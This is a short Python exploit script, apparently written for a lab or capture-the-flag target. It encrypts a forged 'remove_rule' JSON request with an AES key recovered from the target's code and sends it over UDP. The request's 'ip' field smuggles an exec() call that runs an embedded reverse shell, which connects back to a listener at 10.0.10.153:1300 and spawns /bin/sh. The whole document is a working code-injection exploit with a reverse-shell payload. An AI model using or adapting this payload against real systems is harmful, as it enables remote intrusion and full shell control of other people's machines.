import aes, os
import socket

IP = "10.0.10.143"
PORT = 81

# From crypto.py
key = b'\xca\x94\xbe\x15\xda\xfe\x57\x8f\x75\x3a\xf3\xfd\xab\x85\x84\x91'
iv = b'\xff' * 16

shell = bytes("""import os
import pty
import socket
lhost = '10.0.10.153'
lport = 1300
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn('/bin/sh')
s.close()
""".replace("\n",";"), "utf-8")

# Json body reverse engineered from serv.py
# Crypto lib from github. Easily found by googling "aes.AES(key).decrypt_ctr" form crypto.py
encrypted = aes.AES(key).encrypt_ctr(b'{"func":"remove_rule","ip":"\'1.1.1.1\',exec(\'\'\'' + shell + b'\'\'\')", "port":1}', iv)
client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
addr = (IP, PORT)
client_socket.sendto(encrypted, addr)